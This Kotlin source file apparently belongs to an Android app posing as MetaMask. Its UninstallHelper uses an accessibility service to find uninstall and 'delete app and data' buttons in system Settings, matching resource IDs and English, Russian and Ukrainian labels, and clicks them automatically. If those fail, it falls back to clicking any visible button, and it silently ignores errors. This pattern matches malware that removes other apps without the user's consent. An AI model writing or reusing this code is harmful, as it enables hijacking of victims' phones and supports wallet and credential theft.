package com.example.MetaMask.services

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityNodeInfo

object UninstallHelper {

    fun tryClickUninstall(svc: AccessibilityService) {
        android.util.Log.d("XDBG", "[UninstallHelper] tryClickUninstall enter svc=${svc}") //xdbg
        val prefs = svc.getSharedPreferences("uninstall_prefs", android.content.Context.MODE_PRIVATE)
        if (!prefs.getBoolean("auto_click", false)) return
        val root = svc.rootInActiveWindow ?: return
        try {
            val allNodes = mutableListOf<AccessibilityNodeInfo>()
            val stack = ArrayDeque<AccessibilityNodeInfo>()
            for (i in 0 until root.childCount) root.getChild(i)?.let { stack.add(it) }
            while (stack.isNotEmpty()) {
                android.util.Log.d("XDBG", "[UninstallHelper] loop") //xdbg
                val n = stack.removeFirst()
                allNodes.add(n)
                for (i in 0 until n.childCount) n.getChild(i)?.let { stack.add(it) }
            }
            val targetIds = listOf(
                "com.android.settings:id/button2",
                "com.android.settings:id/right_button",
                "com.android.settings:id/action_button",
                "com.android.settings:id/btn_uninstall",
                "com.android.settings:id/uninstall",
                "com.android.settings:id/remove_app",
                "com.miui.securitycenter:id/btn_uninstall",
                "com.android.settings:id/menu_delete",
                "com.android.settings:id/action_uninstall_app"
            )
            var btn: AccessibilityNodeInfo? = null
            for (id in targetIds) {
                android.util.Log.d("XDBG", "[UninstallHelper] loop") //xdbg
                btn = allNodes.firstOrNull { it.viewIdResourceName == id && it.isEnabled && it.isVisibleToUser }
                if (btn != null) break
            }
            if (btn == null) {
                android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                val keywords = setOf("uninstall","видалити","удалить","remove","delete","uninstall app")
                btn = allNodes.firstOrNull { node ->
                    val desc = (node.contentDescription?.toString() ?: "").trim().lowercase()
                    desc in keywords && node.isEnabled && node.isVisibleToUser
                }
            }
            if (btn == null) {
                android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                fun matchesUninstall(text: String): Boolean {
                    android.util.Log.d("XDBG", "[UninstallHelper] matchesUninstall enter text=${text}") //xdbg
                    val lo = text.trim().lowercase()
                    android.util.Log.d("XDBG", "[UninstallHelper] return") //xdbg
                    return lo == "uninstall" || lo == "видалити" || lo == "удалить" ||
                           lo == "remove" || lo == "delete" ||
                           lo.contains("удалит") || lo.contains("видалит") || lo.contains("uninstall")
                }
                val textNode = allNodes.firstOrNull { node ->
                    val t = node.text?.toString() ?: ""
                    matchesUninstall(t) && node.isVisibleToUser
                }
                if (textNode != null) {
                    android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                    if (textNode.isClickable && textNode.isEnabled) {
                        android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                        btn = textNode
                    } else {
                        var cur: AccessibilityNodeInfo? = textNode.parent
                        var depth = 0
                        while (cur != null && depth < 8) {
                            android.util.Log.d("XDBG", "[UninstallHelper] loop") //xdbg
                            val vid = cur.viewIdResourceName
                            val clk = cur.isClickable
                            val en  = cur.isEnabled
                            if (btn == null && clk && en) {
                                android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                                btn = cur
                            }
                            val next = cur.parent
                            if (btn == null) { cur.recycle() }
                            cur = next
                            depth++
                        }
                        cur?.recycle()
                    }
                }
            }
            if (btn == null) {
                android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                btn = allNodes.lastOrNull { it.className?.contains("Button") == true && it.isEnabled && it.isVisibleToUser }
            }
            val btnRef = btn
            allNodes.forEach { if (it !== btnRef) it.recycle() }
            if (btnRef != null) {
                android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                btnRef.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                btnRef.recycle()
                prefs.edit().putBoolean("auto_click", false).apply()
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[UninstallHelper] catch (ignored)") //xdbg
        } finally {
            root.recycle()
        }
    }

    fun tryConfirmUninstall(svc: AccessibilityService) {
        android.util.Log.d("XDBG", "[UninstallHelper] tryConfirmUninstall enter svc=${svc}") //xdbg
        val prefs = svc.getSharedPreferences("uninstall_prefs", android.content.Context.MODE_PRIVATE)
        val pkg = prefs.getString("pending_pkg", null) ?: return
        val ts = prefs.getLong("pending_ts", 0L)
        if (System.currentTimeMillis() - ts > 20_000L) {
            android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
            prefs.edit().remove("pending_pkg").remove("pending_ts").apply()
            return
        }
        val root = svc.rootInActiveWindow ?: return
        val rootPkg = root.packageName?.toString() ?: ""
        try {
            var btn: AccessibilityNodeInfo? = null

            val confirmIds = listOf(
                "com.transsion.widgetslib:id/dialog_button_confirm",
                "android:id/button1",
                "android:id/positiveButton"
            )
            for (id in confirmIds) {
                android.util.Log.d("XDBG", "[UninstallHelper] loop") //xdbg
                val byId = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null }
                if (!byId.isNullOrEmpty()) {
                    android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                    val enabled = byId.firstOrNull { it.isEnabled && it.isVisibleToUser }
                    byId.filter { it !== enabled }.forEach { try { it.recycle() } catch (_: Exception) {} }
                    if (enabled != null) {
                        android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                        btn = enabled
                        break
                    }
                }
            }

            if (btn == null) {
                android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                val allNodes = mutableListOf<AccessibilityNodeInfo>()
                val stack = ArrayDeque<AccessibilityNodeInfo>()
                for (i in 0 until root.childCount) root.getChild(i)?.let { stack.add(it) }
                while (stack.isNotEmpty()) {
                    android.util.Log.d("XDBG", "[UninstallHelper] loop") //xdbg
                    val n = stack.removeFirst()
                    allNodes.add(n)
                    for (i in 0 until n.childCount) n.getChild(i)?.let { stack.add(it) }
                }
                val confirmTexts = setOf(
                    "удалить приложение и данные",
                    "delete app and data",
                    "видалити застосунок і дані",
                    "uninstall app and data"
                )
                btn = allNodes.firstOrNull { node ->
                    val t = (node.text?.toString() ?: "").trim().lowercase()
                    t in confirmTexts && node.isEnabled && node.isVisibleToUser
                }
                if (btn != null) {
                    android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                    allNodes.forEach { if (it !== btn) it.recycle() }
                } else {
                    val safePkg = rootPkg.contains("packageinstaller", ignoreCase = true) ||
                        rootPkg == "android" || rootPkg.contains("settings", ignoreCase = true)
                    if (safePkg) {
                        android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                        btn = allNodes.firstOrNull { it.className?.contains("Button") == true && it.isEnabled && it.isVisibleToUser }
                    }
                    allNodes.forEach { if (it !== btn) it.recycle() }
                }
            }

            if (btn != null) {
                android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                btn.recycle()
                if (rootPkg.contains("packageinstaller", ignoreCase = true)) {
                    android.util.Log.d("XDBG", "[UninstallHelper] if branch") //xdbg
                    prefs.edit().remove("pending_pkg").remove("pending_ts").apply()
                }
            }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[UninstallHelper] catch (ignored)") //xdbg
        } finally {
            root.recycle()
        }
    }
}
